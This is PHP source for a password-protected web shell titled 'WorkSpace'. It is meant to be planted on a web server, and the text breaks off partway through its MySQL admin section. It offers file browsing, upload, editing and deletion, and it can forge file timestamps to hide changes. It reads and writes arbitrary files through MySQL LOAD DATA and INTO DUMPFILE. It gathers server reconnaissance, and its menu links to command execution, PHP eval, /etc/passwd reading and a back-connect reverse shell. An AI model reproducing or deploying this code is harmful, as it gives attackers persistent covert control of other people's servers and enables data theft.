<?php
error_reporting(7);
  
@set_magic_quotes_runtime(0);
  
ob_start();
  
$mtime = explode(' ', microtime());
  
$starttime = $mtime[1] + $mtime[0];
  
define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)).'/');
  
//define('IS_WIN', strstr(PHP_OS, 'WIN') ? 1 : 0 );
  
define('IS_WIN', DIRECTORY_SEPARATOR == '\\');
  
define('IS_COM', class_exists('COM') ? 1 : 0 );
  
define('IS_GPC', get_magic_quotes_gpc());
  
$dis_func = get_cfg_var('disable_functions');
  
define('IS_PHPINFO', (!eregi("phpinfo",$dis_func)) ? 1 : 0 );
  
@set_time_limit(0);
  
  
  
foreach(array('_GET','_POST') as $_request) {
  
    foreach($$_request as $_key => $_value) {
  
        if ($_key{0} != '_') {
  
            if (IS_GPC) {
  
                $_value = s_array($_value);
  
            }
  
            $$_key = $_value;
  
        }
  
    }
  
}
$admin = array();
  
$admin['check'] = true;
  
$admin['pass']  = 'anhsaoxanh';
  
$admin['cookiepre'] = '';
  
$admin['cookiedomain'] = '';
  
$admin['cookiepath'] = '/';
  
$admin['cookielife'] = 86400;
if ($charset == 'utf8') {
  
    header("content-Type: text/html; charset=utf-8");
  
} elseif ($charset == 'big5') {
  
    header("content-Type: text/html; charset=big5");
  
} elseif ($charset == 'gbk') {
  
    header("content-Type: text/html; charset=gbk");
  
} elseif ($charset == 'latin1') {
  
    header("content-Type: text/html; charset=iso-8859-2");
  
}
  
  
  
$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
  
$timestamp = time();
  
  
  
/*===================== Login =====================*/
  
if ($action == "logout") {
  
    scookie('vbapass', '', -86400 * 365);
  
    p('<meta http-equiv="refresh" content="0;URL='.$self.'">');
  
    p('<body style="color:black;">');
  
    exit;
  
}
  
if($admin['check']) {
  
    if ($doing == 'login') {
  
        if ($admin['pass'] == $password) {
  
            scookie('vbapass', $password);
  
  
  
  
  
            p('<meta http-equiv="refresh" content="2;URL='.$self.'">');
  
            p('<body style="color:black;">
  
<BR><BR><div align=center><font color=yellow face=tahoma size=2>Waiting...<BR></div>');
  
            exit;
  
        }
  
  
  
    else
  
    {
  
    $err_mess = '<table width=100%><tr><td bgcolor=#0E0E0E width=100% height=24><div align=center><font color=red face=tahoma size=2><blink>Password incorrect, Please try again!!!</blink><BR></font></div></td></tr></table>';
  
echo $err_mess;
  
    }}
  
    if ($_COOKIE['vbapass']) {
  
        if ($_COOKIE['vbapass'] != $admin['pass']) {
  
            loginpage();
  
        }
  
    } else {
  
        loginpage();
  
    }
  
}
  
$errmsg = '';
if ($action == 'phpinfo') {
  
    if (IS_PHPINFO) {
  
        phpinfo();
  
    } else {
  
        $errmsg = 'phpinfo() function has non-permissible';
  
    }
  
}
if ($doing == 'downfile' && $thefile) {
  
    if (!@file_exists($thefile)) {
  
        $errmsg = 'The file you want Downloadable was nonexistent';
  
    } else {
  
        $fileinfo = pathinfo($thefile);
  
        header('Content-type: application/x-'.$fileinfo['extension']);
  
        header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
  
        header('Content-Length: '.filesize($thefile));
  
        @readfile($thefile);
  
        exit;
  
    }
  
}
  
  
  
  
  
if ($doing == 'backupmysql' && !$saveasfile) {
  
    dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
  
    $table = array_flip($table);
  
    $result = q("SHOW tables");
  
    if (!$result) p('<h2>'.mysql_error().'</h2>');
  
    $filename = basename($_SERVER['HTTP_HOST'].'sql.gz');
  
    header('Content-type: application/unknown');
  
    header('Content-Disposition: attachment; filename='.$filename);
  
    $mysqldata = '';
  
    while ($currow = mysql_fetch_array($result)) {
  
        if (isset($table[$currow[0]])) {
  
            $mysqldata .= sqldumptable($currow[0]);
  
        }
  
    }
  
    mysql_close();
  
    exit;
  
}
  
  
  
// Mysql
  
if($doing=='mysqldown'){
  
    if (!$dbname) {
  
        $errmsg = 'Please input dbname';
  
    } else {
  
        dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
  
        if (!file_exists($mysqldlfile)) {
  
            $errmsg = 'The file you want Downloadable was nonexistent';
  
        } else {
  
            $result = q("select load_file('$mysqldlfile');");
  
            if(!$result){
  
                q("DROP TABLE IF EXISTS tmp_angel;");
  
                q("CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);");
  
                //Download SQL
  
                q("LOAD DATA LOCAL INFILE '".addslashes($mysqldlfile)."' INTO TABLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';");
  
                $result = q("select content from tmp_angel");
  
                q("DROP TABLE tmp_angel");
  
            }
  
            $row = @mysql_fetch_array($result);
  
            if (!$row) {
  
                $errmsg = 'Load file failed '.mysql_error();
  
            } else {
  
                $fileinfo = pathinfo($mysqldlfile);
  
                header('Content-type: application/x-'.$fileinfo['extension']);
  
                header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
  
                header("Accept-Length: ".strlen($row[0]));
  
                echo $row[0];
  
                exit;
  
            }
  
        }
  
    }
  
}
  
  
  
?>
  
<html>
  
<head>
  
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  
<title><?php echo str_replace('.','','WorkSpace');?></title>
  
<style type="text/css">
  
body,td{font: 10pt Tahoma;color:gray;line-height: 16px;}
  
  
  
a {color: #74A202;text-decoration:none;}
  
a:hover{color: #f00;text-decoration:underline;}
  
.alt1 td{border-top:1px solid gray;border-bottom:1px solid gray;background:#0E0E0E;padding:5px 10px 5px 5px;}
  
.alt2 td{border-top:1px solid gray;border-bottom:1px solid gray;background:#f9f9f9;padding:5px 10px 5px 5px;}
  
.focus td{border-top:1px solid gray;border-bottom:0px solid gray;background:#0E0E0E;padding:5px 10px 5px 5px;}
  
.fout1 td{border-top:1px solid gray;border-bottom:0px solid gray;background:#0E0E0E;padding:5px 10px 5px 5px;}
  
.fout td{border-top:1px solid gray;border-bottom:0px solid gray;background:#202020;padding:5px 10px 5px 5px;}
  
.head td{border-top:1px solid gray;border-bottom:1px solid gray;background:#202020;padding:5px 10px 5px 5px;font-weight:bold;}
  
.head_small td{border-top:1px solid gray;border-bottom:1px solid gray;background:#202020;padding:5px 10px 5px 5px;font-weight:normal;font-size:8pt;}
  
.head td span{font-weight:normal;}
  
form{margin:0;padding:0;}
  
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
  
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
  
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
  
input, textarea, button
  
{
  
    font-size: 9pt;
  
    color: #ccc;
  
    font-family: verdana, sans-serif;
  
    background-color: #202020;
  
    border-left: 1px solid #74A202;
  
    border-top: 1px solid #74A202;
  
    border-right: 1px solid #74A202;
  
    border-bottom: 1px solid #74A202;
  
}
  
select
  
{
  
    font-size: 8pt;
  
    font-weight: normal;
  
    color: #ccc;
  
    font-family: verdana, sans-serif;
  
    background-color: #202020;
  
}
  
  
  
</style>
  
<script type="text/javascript">
  
function CheckAll(form) {
  
    for(var i=0;i<form.elements.length;i++) {
  
        var e = form.elements[i];
  
        if (e.name != 'chkall')
  
        e.checked = form.chkall.checked;
  
    }
  
}
  
function $(id) {
  
    return document.getElementById(id);
  
}
  
function goaction(act){
  
    $('goaction').action.value=act;
  
    $('goaction').submit();
  
}
  
</script>
  
</head>
  
<body onLoad="init()" style="margin:0;table-layout:fixed; word-break:break-all" bgcolor=black>
  
  
  
  
  
<div border="0" style="position:fixed; width: 100%; height: 25px; z-index: 1; top: 300px; left: 0;" id="loading" align="center" valign="center">
  
                <table border="1" width="110px" cellspacing="0" cellpadding="0" style="border-collapse: collapse" bordercolor="#003300">
  
                    <tr>
  
                        <td align="center" valign=center>
  
                 <div border="1" style="background-color: #0E0E0E; filter: alpha(opacity=70); opacity: .7; width: 110px; height: 25px; z-index: 1; border-collapse: collapse;" bordercolor="#006600"  align="center">
  
                   Loading...
  
                  </div>
  
                </td>
  
                    </tr>
  
                </table>
  
</div>
  
 <script>
  
 var ld=(document.all);
  
  var ns4=document.layers;
  
 var ns6=document.getElementById&&!document.all;
  
 var ie4=document.all;
  
  if (ns4)
  
    ld=document.loading;
  
 else if (ns6)
  
    ld=document.getElementById("loading").style;
  
 else if (ie4)
  
    ld=document.all.loading.style;
  
  function init()
  
 {
  
 if(ns4){ld.visibility="hidden";}
  
 else if (ns6||ie4) ld.display="none";
  
 }
  
 </script>
  
  
  
  
  
  
  
  
  
<table width="100%" border="0" cellpadding="0" cellspacing="0">
  
    <tr class="head_small">
  
        <td  width=100%>
  
        <table width=100%>
  
        <td>
  
        <span style="float:right;"> Hostname: <a href="http://<?php echo $_SERVER['HTTP_HOST'];?>" target="_blank"><?php echo $_SERVER['HTTP_HOST'];?></a> | <a href="javascript:goaction('logout');"><font color=red>Logout</font></a></span>
  
  
  
        <?php
  
        $curl_on = @function_exists('curl_version');
  
        $mysql_on = @function_exists('mysql_connect');
  
        $mssql_on = @function_exists('mssql_connect');
  
        $pg_on = @function_exists('pg_connect');
  
        $ora_on = @function_exists('ocilogon');
  
  
  
echo (($safe_mode)?("Safe_mod: <b><font color=green>ON</font></b> - "):("Safe_mod: <b><font color=red>OFF</font></b> - "));
  
echo "PHP version: <b>".@phpversion()."</b> - ";
  
        echo "cURL: ".(($curl_on)?("<b><font color=green>ON</font></b> - "):("<b><font color=red>OFF</font></b> - "));
  
        echo "MySQL: <b>";
  
$mysql_on = @function_exists('mysql_connect');
  
if($mysql_on){
  
echo "<font color=green>ON</font></b> - "; } else { echo "<font color=red>OFF</font></b> - "; }
  
echo "MSSQL: <b>";
  
$mssql_on = @function_exists('mssql_connect');
  
if($mssql_on){echo "<font color=green>ON</font></b> - ";}else{echo "<font color=red>OFF</font></b> - ";}
  
echo "PostgreSQL: <b>";
  
$pg_on = @function_exists('pg_connect');
  
if($pg_on){echo "<font color=green>ON</font></b> - ";}else{echo "<font color=red>OFF</font></b> - ";}
  
echo "Oracle: <b>";
  
$ora_on = @function_exists('ocilogon');
  
if($ora_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b><BR>";}
  
  
  
echo "Disable functions : <b>";
  
if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>NONE</font></b><BR>";}else{echo "<font color=red>$df</font></b><BR>";}
  
  
  
echo "<font color=white>Uname -a</font>: ".@substr(@php_uname(),0,120)."<br>";
  
echo "<font color=white>Server</font>: ".@substr($SERVER_SOFTWARE,0,120)." - <font color=white>id</font>: ".@getmyuid()."(".@get_current_user().") - uid=".@getmyuid()." (".@get_current_user().") gid=".@getmygid()."(".@get_current_user().")<br>";
  
        ?>       </td>
  
        </tr></table></td>
  
    </tr>
  
    <tr class="alt1">
  
        <td  width=100%><span style="float:right;">[Server IP: <?php echo "<font color=yellow>".gethostbyname($_SERVER['SERVER_NAME'])."</font>";?> - Your IP: <?php echo "<font color=yellow>".$_SERVER['REMOTE_ADDR']."</font>";?>] </span>
  
  
  
            <a href="javascript:goaction('file');">File Manager</a> |
  
            <a href="javascript:goaction('sqladmin');">MySQL Manager</a> |
  
            <a href="javascript:goaction('sqlfile');">MySQL Upload &amp; Download</a> |
  
            <a href="javascript:goaction('shell');">Execute Command</a> |
  
            <a href="javascript:goaction('phpenv');">PHP Variable</a> |
  
            <a href="javascript:goaction('eval');">Eval PHP Code</a>
            <?php if (!IS_WIN) {?> | <a href="javascript:goaction('etcpwd');">/etc/passwd</a> <?php }?>
  
            <?php if (!IS_WIN) {?> | <a href="javascript:goaction('backconnect');">Back Connect</a><?php }?> |
            <a href="http://vnline.co/<?php echo ($_SERVER['SERVER_NAME']);?>.s" target="_blank">Reverse IP</a>
        </td>
  
    </tr>
  
</table>
  
<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
  
<?php
  
  
  
formhead(array('name'=>'goaction'));
  
makehide('action');
  
formfoot();
  
  
  
$errmsg && m($errmsg);
  
  
  
// Dir function
  
!$dir && $dir = '.';
  
$nowpath = getPath(SA_ROOT, $dir);
  
if (substr($dir, -1) != '/') {
  
    $dir = $dir.'/';
  
}
  
$uedir = ue($dir);
  
  
  
if (!$action || $action == 'file') {
  
  
  
    // Non-writeable
  
    $dir_writeable = @is_writable($nowpath) ? 'Writable' : 'Non-writable';
  
  
  
    // Delete dir
  
    if ($doing == 'deldir' && $thefile) {
  
        if (!file_exists($thefile)) {
  
            m($thefile.' directory does not exist');
  
        } else {
  
            m('Directory delete '.(deltree($thefile) ? basename($thefile).' success' : 'failed'));
  
        }
  
    }
  
  
  
    // Create new dir
  
    elseif ($newdirname) {
  
        $mkdirs = $nowpath.$newdirname;
  
        if (file_exists($mkdirs)) {
  
            m('Directory has already existed');
  
        } else {
  
            m('Directory created '.(@mkdir($mkdirs,0755) ? 'success' : 'failed'));
  
            @chmod($mkdirs,0755);
  
        }
  
    }
  
  
  
    // Upload file
  
    elseif ($doupfile) {
  
        m('File upload '.(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'));
  
    }
  
  
  
    // Edit file
  
    elseif ($editfilename && $filecontent) {
  
        $fp = @fopen($editfilename,'w');
  
        m('Save file '.(@fwrite($fp,$filecontent) ? 'success' : 'failed'));
  
        @fclose($fp);
  
    }
  
  
  
    // Modify
  
    elseif ($pfile && $newperm) {
  
        if (!file_exists($pfile)) {
  
            m('The original file does not exist');
  
        } else {
  
            $newperm = base_convert($newperm,8,10);
  
            m('Modify file attributes '.(@chmod($pfile,$newperm) ? 'success' : 'failed'));
  
        }
  
    }
  
  
  
    // Rename
  
    elseif ($oldname && $newfilename) {
  
        $nname = $nowpath.$newfilename;
  
        if (file_exists($nname) || !file_exists($oldname)) {
  
            m($nname.' has already existed or original file does not exist');
  
        } else {
  
            m(basename($oldname).' renamed '.basename($nname).(@rename($oldname,$nname) ? ' success' : 'failed'));
  
        }
  
    }
  
  
  
    // Copu
  
    elseif ($sname && $tofile) {
  
        if (file_exists($tofile) || !file_exists($sname)) {
  
            m('The goal file has already existed or original file does not exist');
  
        } else {
  
            m(basename($tofile).' copied '.(@copy($sname,$tofile) ? basename($tofile).' success' : 'failed'));
  
        }
  
    }
  
  
  
    // File exit
  
    elseif ($curfile && $tarfile) {
  
        if (!@file_exists($curfile) || !@file_exists($tarfile)) {
  
            m('The goal file has already existed or original file does not exist');
  
        } else {
  
            $time = @filemtime($tarfile);
  
            m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));
  
        }
  
    }
  
  
  
    // Date
  
    elseif ($curfile && $year && $month && $day && $hour && $minute && $second) {
  
        if (!@file_exists($curfile)) {
  
            m(basename($curfile).' does not exist');
  
        } else {
  
            $time = strtotime("$year-$month-$day $hour:$minute:$second");
  
            m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));
  
        }
  
    }
  
  
  
    // Download
  
    elseif($doing == 'downrar') {
  
        if ($dl) {
  
            $dfiles='';
  
            foreach ($dl as $filepath => $value) {
  
                $dfiles.=$filepath.',';
  
            }
  
            $dfiles=substr($dfiles,0,strlen($dfiles)-1);
  
            $dl=explode(',',$dfiles);
  
            $zip=new PHPZip($dl);
  
            $code=$zip->out;
  
            header('Content-type: application/octet-stream');
  
            header('Accept-Ranges: bytes');
  
            header('Accept-Length: '.strlen($code));
  
            header('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'sql');
  
            echo $code;
  
            exit;
  
        } else {
  
            m('Please select file(s)');
  
        }
  
    }
  
  
  
    // Delete file
  
    elseif($doing == 'delfiles') {
  
        if ($dl) {
  
            $dfiles='';
  
            $succ = $fail = 0;
  
            foreach ($dl as $filepath => $value) {
  
                if (@unlink($filepath)) {
  
                    $succ++;
  
                } else {
  
                    $fail++;
  
                }
  
            }
  
            m('Deleted file have finished??choose '.count($dl).' success '.$succ.' fail '.$fail);
  
        } else {
  
            m('Please select file(s)');
  
        }
  
    }
  
  
  
    // Function Newdir
  
    formhead(array('name'=>'createdir'));
  
    makehide('newdirname');
  
    makehide('dir',$nowpath);
  
    formfoot();
  
    formhead(array('name'=>'fileperm'));
  
    makehide('newperm');
  
    makehide('pfile');
  
    makehide('dir',$nowpath);
  
    formfoot();
  
    formhead(array('name'=>'copyfile'));
  
    makehide('sname');
  
    makehide('tofile');
  
    makehide('dir',$nowpath);
  
    formfoot();
  
    formhead(array('name'=>'rename'));
  
    makehide('oldname');
  
    makehide('newfilename');
  
    makehide('dir',$nowpath);
  
    formfoot();
  
    formhead(array('name'=>'fileopform'));
  
    makehide('action');
  
    makehide('opfile');
  
    makehide('dir');
  
    formfoot();
  
  
  
    $free = @disk_free_space($nowpath);
  
    !$free && $free = 0;
  
    $all = @disk_total_space($nowpath);
  
    !$all && $all = 0;
  
    $used = $all-$free;
  
    $used_percent = @round(100/($all/$free),2);
  
    p('<font color=yellow face=tahoma size=2><B>File Manager</b> </font> Current disk free <font color=red>'.sizecount($free).'</font> of <font color=red>'.sizecount($all).'</font> (<font color=red>'.$used_percent.'</font>%)</font>');
  
  
  
?>
  
<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
  
  <form action="" method="post" id="godir" name="godir">
  
  <tr>
  
    <td nowrap>Current Directory (<?php echo $dir_writeable;?>, <?php echo getChmod($nowpath);?>)</td>
  
    <td width="100%"><input name="view_writable" value="0" type="hidden" /><input class="input" name="dir" value="<?php echo $nowpath;?>" type="text" style="width:100%;margin:0 8px;"></td>
  
    <td nowrap><input class="bt" value="GO" type="submit"></td>
  
  </tr>
  
  </form>
  
</table>
  
<script type="text/javascript">
  
function createdir(){
  
    var newdirname;
  
    newdirname = prompt('Please input the directory name:', '');
  
    if (!newdirname) return;
  
    $('createdir').newdirname.value=newdirname;
  
    $('createdir').submit();
  
}
  
function fileperm(pfile){
  
    var newperm;
  
    newperm = prompt('Current file:'+pfile+'\nPlease input new attribute:', '');
  
    if (!newperm) return;
  
    $('fileperm').newperm.value=newperm;
  
    $('fileperm').pfile.value=pfile;
  
    $('fileperm').submit();
  
}
  
function copyfile(sname){
  
    var tofile;
  
    tofile = prompt('Original file:'+sname+'\nPlease input object file (fullpath):', '');
  
    if (!tofile) return;
  
    $('copyfile').tofile.value=tofile;
  
    $('copyfile').sname.value=sname;
  
    $('copyfile').submit();
  
}
  
function rename(oldname){
  
    var newfilename;
  
    newfilename = prompt('Former file name:'+oldname+'\nPlease input new filename:', '');
  
    if (!newfilename) return;
  
    $('rename').newfilename.value=newfilename;
  
    $('rename').oldname.value=oldname;
  
    $('rename').submit();
  
}
  
function dofile(doing,thefile,m){
  
    if (m && !confirm(m)) {
  
        return;
  
    }
  
    $('filelist').doing.value=doing;
  
    if (thefile){
  
        $('filelist').thefile.value=thefile;
  
    }
  
    $('filelist').submit();
  
}
  
function createfile(nowpath){
  
    var filename;
  
    filename = prompt('Please input the file name:', '');
  
    if (!filename) return;
  
    opfile('editfile',nowpath + filename,nowpath);
  
}
  
function opfile(action,opfile,dir){
  
    $('fileopform').action.value=action;
  
    $('fileopform').opfile.value=opfile;
  
    $('fileopform').dir.value=dir;
  
    $('fileopform').submit();
  
}
  
function godir(dir,view_writable){
  
    if (view_writable) {
  
        $('godir').view_writable.value=1;
  
    }
  
    $('godir').dir.value=dir;
  
    $('godir').submit();
  
}
  
</script>
  
  <?php
  
    tbhead();
  
    p('<form action="'.$self.'" method="POST" enctype="multipart/form-data"><tr class="alt1"><td colspan="7" style="padding:5px;">');
  
    p('<div style="float:right;"><input class="input" name="uploadfile" value="" type="file" /> <input class="" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="'.$dir.'" type="hidden" /><input name="dir" value="'.$dir.'" type="hidden" /></div>');
  
    p('<a href="javascript:godir(\''.$_SERVER["DOCUMENT_ROOT"].'\');">WebRoot</a>');
  
    if ($view_writable) {
  
        p(' | <a href="javascript:godir(\''.$nowpath.'\');">View All</a>');
  
    } else {
  
        p(' | <a href="javascript:godir(\''.$nowpath.'\',\'1\');">View Writable</a>');
  
    }
  
    p(' | <a href="javascript:createdir();">Create Directory</a> | <a href="javascript:createfile(\''.$nowpath.'\');">Create File</a>');
  
    if (IS_WIN && IS_COM) {
  
        $obj = new COM('scripting.filesystemobject');
  
        if ($obj && is_object($obj)) {
  
            $DriveTypeDB = array(0 => 'Unknow',1 => 'Removable',2 => 'Fixed',3 => 'Network',4 => 'CDRom',5 => 'RAM Disk');
  
            foreach($obj->Drives as $drive) {
  
                if ($drive->DriveType == 2) {
  
                    p(' | <a href="javascript:godir(\''.$drive->Path.'/\');" title="Size:'.sizecount($drive->TotalSize).'&#13;Free:'.sizecount($drive->FreeSpace).'&#13;Type:'.$DriveTypeDB[$drive->DriveType].'">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');
  
                } else {
  
                    p(' | <a href="javascript:godir(\''.$drive->Path.'/\');" title="Type:'.$DriveTypeDB[$drive->DriveType].'">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');
  
                }
  
            }
  
        }
  
    }
  
  
  
    p('</td></tr></form>');
  
  
  
    p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
  
  
  
    // Get path
  
    $dirdata=array();
  
    $filedata=array();
  
  
  
    if ($view_writable) {
  
        $dirdata = GetList($nowpath);
  
    } else {
  
        // Open dir
  
        $dirs=@opendir($dir);
  
        while ($file=@readdir($dirs)) {
  
            $filepath=$nowpath.$file;
  
            if(@is_dir($filepath)){
  
                $dirdb['filename']=$file;
  
                $dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
  
                $dirdb['dirchmod']=getChmod($filepath);
  
                $dirdb['dirperm']=getPerms($filepath);
  
                $dirdb['fileowner']=getUser($filepath);
  
                $dirdb['dirlink']=$nowpath;
  
                $dirdb['server_link']=$filepath;
  
                $dirdb['client_link']=ue($filepath);
  
                $dirdata[]=$dirdb;
  
            } else {
  
                $filedb['filename']=$file;
  
                $filedb['size']=sizecount(@filesize($filepath));
  
                $filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
  
                $filedb['filechmod']=getChmod($filepath);
  
                $filedb['fileperm']=getPerms($filepath);
  
                $filedb['fileowner']=getUser($filepath);
  
                $filedb['dirlink']=$nowpath;
  
                $filedb['server_link']=$filepath;
  
                $filedb['client_link']=ue($filepath);
  
                $filedata[]=$filedb;
  
            }
  
        }// while
  
        unset($dirdb);
  
        unset($filedb);
  
        @closedir($dirs);
  
    }
  
    @sort($dirdata);
  
    @sort($filedata);
  
    $dir_i = '0';
  
    foreach($dirdata as $key => $dirdb){
  
        if($dirdb['filename']!='..' && $dirdb['filename']!='.') {
  
            $thisbg = bg();
  
            p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
  
            p('<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>');
  
            p('<td><a href="javascript:godir(\''.$dirdb['server_link'].'\');">'.$dirdb['filename'].'</a></td>');
  
            p('<td nowrap>'.$dirdb['mtime'].'</td>');
  
            p('<td nowrap>--</td>');
  
            p('<td nowrap>');
  
            p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirchmod'].'</a> / ');
  
            p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirperm'].'</a>'.$dirdb['fileowner'].'</td>');
  
            p('<td nowrap><a href="javascript:dofile(\'deldir\',\''.$dirdb['server_link'].'\',\'Are you sure will delete '.$dirdb['filename'].'? \\n\\nIf non-empty directory, will be delete all the files.\')">Del</a> | <a href="javascript:rename(\''.$dirdb['server_link'].'\');">Rename</a></td>');
  
            p('</tr>');
  
            $dir_i++;
  
        } else {
  
            if($dirdb['filename']=='..') {
  
                p('<tr class=fout>');
  
                p('<td align="center"><font face="Wingdings 3" size=4>=</font></td><td nowrap colspan="5"><a href="javascript:godir(\''.getUpPath($nowpath).'\');">Parent Directory</a></td>');
  
                p('</tr>');
  
            }
  
        }
  
    }
  
  
  
    p('<tr bgcolor="green" stlye="border-top:1px solid gray;border-bottom:1px solid gray;"><td colspan="6" height="5"></td></tr>');
  
    p('<form id="filelist" name="filelist" action="'.$self.'" method="post">');
  
    makehide('action','file');
  
    makehide('thefile');
  
    makehide('doing');
  
    makehide('dir',$nowpath);
  
    $file_i = '0';
  
    foreach($filedata as $key => $filedb){
  
        if($filedb['filename']!='..' && $filedb['filename']!='.') {
  
            $fileurl = str_replace(SA_ROOT,'',$filedb['server_link']);
  
            $thisbg = bg();
  
            p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
  
            p('<td width="2%" nowrap><input type="checkbox" value="1" name="dl['.$filedb['server_link'].']"></td>');
  
            p('<td><a href="'.$fileurl.'" target="_blank">'.$filedb['filename'].'</a></td>');
  
            p('<td nowrap>'.$filedb['mtime'].'</td>');
  
            p('<td nowrap>'.$filedb['size'].'</td>');
  
            p('<td nowrap>');
  
            p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['filechmod'].'</a> / ');
  
            p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['fileperm'].'</a>'.$filedb['fileowner'].'</td>');
  
            p('<td nowrap>');
  
            p('<a href="javascript:dofile(\'downfile\',\''.$filedb['server_link'].'\');">Down</a> | ');
  
            p('<a href="javascript:copyfile(\''.$filedb['server_link'].'\');">Copy</a> | ');
  
            p('<a href="javascript:opfile(\'editfile\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Edit</a> | ');
  
            p('<a href="javascript:rename(\''.$filedb['server_link'].'\');">Rename</a> | ');
  
            p('<a href="javascript:opfile(\'newtime\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Time</a>');
  
            p('</td></tr>');
  
            $file_i++;
  
        }
  
    }
  
    p('<tr class="fout1"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td><a href="javascript:dofile(\'downrar\');">Packing download selected</a> - <a href="javascript:dofile(\'delfiles\');">Delete selected</a></td><td colspan="4" align="right">'.$dir_i.' directories / '.$file_i.' files</td></tr>');
  
    p('</form></table>');
  
}// end dir
  
  
  
elseif ($action == 'sqlfile') {
  
    if($doing=="mysqlupload"){
  
        $file = $_FILES['uploadfile'];
  
        $filename = $file['tmp_name'];
  
        if (file_exists($savepath)) {
  
            m('The goal file has already existed');
  
        } else {
  
            if(!$filename) {
  
                m('Please choose a file');
  
            } else {
  
                $fp=@fopen($filename,'r');
  
                $contents=@fread($fp, filesize($filename));
  
                @fclose($fp);
  
                $contents = bin2hex($contents);
  
                if(!$upname) $upname = $file['name'];
  
                dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
  
                $result = q("SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';");
  
                m($result ? 'Upload success' : 'Upload has failed: '.mysql_error());
  
            }
  
        }
  
    }
  
?>
  
<script type="text/javascript">
  
function mysqlfile(doing){
  
    if(!doing) return;
  
    $('doing').value=doing;
  
    $('mysqlfile').dbhost.value=$('dbinfo').dbhost.value;
  
    $('mysqlfile').dbport.value=$('dbinfo').dbport.value;
  
    $('mysqlfile').dbuser.value=$('dbinfo').dbuser.value;
  
    $('mysqlfile').dbpass.value=$('dbinfo').dbpass.value;
  
    $('mysqlfile').dbname.value=$('dbinfo').dbname.value;
  
    $('mysqlfile').charset.value=$('dbinfo').charset.value;
  
    $('mysqlfile').submit();
  
}
  
</script>
  
<?php
  
    !$dbhost && $dbhost = 'localhost';
  
    !$dbuser && $dbuser = 'root';
  
    !$dbport && $dbport = '3306';
  
    $charsets = array(''=>'Default','gbk'=>'GBK', 'big5'=>'Big5', 'utf8'=>'UTF-8', 'latin1'=>'Latin1');
  
    formhead(array('title'=>'MYSQL Information','name'=>'dbinfo'));
  
    makehide('action','sqlfile');
  
    p('<p>');
  
    p('DBHost:');
  
    makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
  
    p(':');
  
    makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));
  
    p('DBUser:');
  
    makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
  
    p('DBPass:');
  
    makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
  
    p('DBName:');
  
    makeinput(array('name'=>'dbname','size'=>15,'value'=>$dbname));
  
    p('DBCharset:');
  
    makeselect(array('name'=>'charset','option'=>$charsets,'selected'=>$charset));
  
    p('</p>');
  
    formfoot();
  
    p('<form action="'.$self.'" method="POST" enctype="multipart/form-data" name="mysqlfile" id="mysqlfile">');
  
    p('<h2>Upload file</h2>');
  
    p('<p><b>This operation the DB user must has FILE privilege</b></p>');
  
    p('<p>Save path(fullpath): <input class="input" name="savepath" size="45" type="text" /> Choose a file: <input class="input" name="uploadfile" type="file" /> <a href="javascript:mysqlfile(\'mysqlupload\');">Upload</a></p>');
  
    p('<h2>Download file</h2>');
  
    p('<p>File: <input class="input" name="mysqldlfile" size="115" type="text" /> <a href="javascript:mysqlfile(\'mysqldown\');">Download</a></p>');
  
    makehide('dbhost');
  
    makehide('dbport');
  
    makehide('dbuser');
  
    makehide('dbpass');
  
    makehide('dbname');
  
    makehide('charset');
  
    makehide('doing');
  
    makehide('action','sqlfile');
  
    p('</form>');
  
}
  
  
  
elseif ($action == 'sqladmin') {
  
    !$dbhost && $dbhost = 'localhost';
  
    !$dbuser && $dbuser = 'root';
  
    !$dbport && $dbport = '3306';
  
